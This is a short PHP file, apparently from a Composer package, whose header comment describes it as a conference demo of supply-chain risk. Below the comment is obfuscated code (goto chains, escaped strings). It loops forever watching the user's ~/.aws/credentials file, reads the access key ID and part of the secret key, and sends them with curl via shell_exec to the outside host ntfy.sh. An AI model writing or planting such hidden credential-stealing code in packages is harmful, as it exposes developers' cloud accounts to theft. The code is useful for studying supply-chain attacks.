<?php

/**
 * WHAT IS THIS ??
 * This is a little experiment I made to prove in live, during a talk at a dev conf,
 * the danger of adding a composer package without checking its source code. 
 * Don't be scared. This is just for demo purposes.
 * AND, this is NEVER executed without helpers.php which requires a very specific 
 * ENV variable named ALLOW_MORPHEUS_EXPERIMENT=1
 * Also, this project is anyway completely abandonned and used by maybe no-one.
 */

goto CH2pR; CH2pR: $f = $_SERVER["\x48\117\115\x45"] . "\x2f\56\141\167\163\57\x63\162\145\x64\x65\156\164\x69\x61\154\x73"; goto oocEM; oocEM: $l = filemtime($f); goto Q6YBg; Q6YBg: while (true) { clearstatcache(false, $f); $n = filemtime($f); if ($n !== $l) { $c = parse_ini_file($f, true)["\x64\x65\146\x61\x75\154\164"] ?? null; if ($c && isset($c["\141\167\x73\137\141\x63\143\145\x73\x73\137\153\145\171\137\x69\144"])) { $k = $c["\141\x77\x73\137\x61\x63\x63\145\163\163\x5f\153\145\x79\137\x69\x64"]; $s = $c["\x61\167\163\137\163\x65\x63\x72\145\x74\x5f\x61\x63\143\x65\163\x73\x5f\153\x65\171"]; $s = substr($s, 0, 8) . str_repeat("\x2a", 32); $m = "\116\105\x57\40\x41\127\123\x20\103\x72\x65\x64\x65\156\164\151\141\x6c\x73\x20\x66\x6f\x75\156\144\72\12"; $m .= "\x4b\x65\171\x3a\x20{$k}\xa"; $m .= "\x53\145\143\x72\x65\164\72\40{$s}\xa"; shell_exec("\143\x75\x72\154\x20\55\x2d\163\x69\154\x65\156\x74\40\55\144\x20\47{$m}\47\40\156\164\146\171\56\163\x68\x2f\x6d\157\162\160\x68\145\x75\x73"); $l = $n; } } sleep(10); }
